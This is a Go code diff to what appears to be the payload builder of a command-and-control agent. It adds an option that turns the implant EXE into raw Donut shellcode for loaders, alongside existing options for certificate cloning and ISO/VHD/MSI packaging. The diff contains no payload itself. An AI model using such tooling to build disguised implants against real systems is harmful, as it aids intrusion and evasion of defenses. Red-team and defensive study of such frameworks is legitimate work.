@@ -44,6 +44,7 @@ type buildOpts struct {
 	cloneCert      string
 	retries        int
 	taskingSize    int
+	shellcode      bool
 	packaging      string
 	packagePW      string
 	msiApp         string
@@ -179,8 +180,17 @@ func parseBuildParams(bp *agentstructs.BuildParameters) (buildOpts, error) {
 		return fail(err)
 	}
 	o.taskingSize = int(tasking)
+	if o.shellcode, err = boolParam(bp, "shellcode"); err != nil {
+		return fail(err)
+	}
 	if o.packaging, err = chooseParam(bp, "package", "none", "zip", "iso", "img", "vhd", "7z", "msi"); err != nil {
 		return fail(err)
+	}
+	if o.shellcode && o.packaging != "none" {
+		return fail(fmt.Errorf("shellcode output needs package=none"))
+	}
+	if o.shellcode && o.sign != "none" {
+		return fail(fmt.Errorf("shellcode output cannot be signed (use sign=none)"))
 	}
 	o.packagePW = stringParam(bp, "package_password")
 	o.msiApp = stringParam(bp, "msi_app_name")
@@ -267,6 +277,7 @@ func buildParameters() []agentstructs.BuildParameter {
 		file("clone_cert", "Donor PE whose certificate is cloned (optional, runs before signing)."),
 		number("retries", "Checkin attempts with doubling backoff.", 3),
 		number("tasking_size", "Tasks per poll (-1 = all).", -1),
+		boolean("shellcode", "Convert the EXE to raw shellcode (.bin) with Donut. Needs package=none and sign=none; the .bin feeds service_wrapper and external loaders.", false),
 		choose("package", "Wrap the EXE into a container.", []string{"none", "zip", "iso", "img", "vhd", "7z", "msi"}, "none"),
 		str("package_password", "Password for 7z packaging (optional)."),
 		str("msi_app_name", "MSI product name (optional)."),
